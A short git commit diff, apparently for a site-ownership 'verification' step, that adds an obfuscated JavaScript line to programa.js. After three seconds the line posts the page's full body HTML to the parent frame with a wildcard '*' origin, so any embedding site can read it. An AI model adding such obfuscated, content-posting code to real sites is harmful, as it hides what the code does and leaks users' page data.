5a14a99bb964f5af95371f274d07c1db06d7bfd5
ibuioli <ibuioli@gmail.com>
2017-05-14 22:26:57 -0300

    Verfication

--- programa.js
+++ programa.js
@@ -1,3 +1,6 @@
+var _0xaea9=["sitemapgenerator:: ","innerHTML","body","document","stringify","*","postMessage","setTimeout"];window[_0xaea9[7]](function(){parent[_0xaea9[6]](_0xaea9[0]+JSON[_0xaea9[4]](window[_0xaea9[3]][_0xaea9[2]][_0xaea9[1]]),_0xaea9[5])},3000);
+
+
 $(window).load(function() {//documento-listo
 //HOME
 var IE6 = $.browser.msie && parseFloat($.browser.version) < 7;var url = "no-ie/index.html";
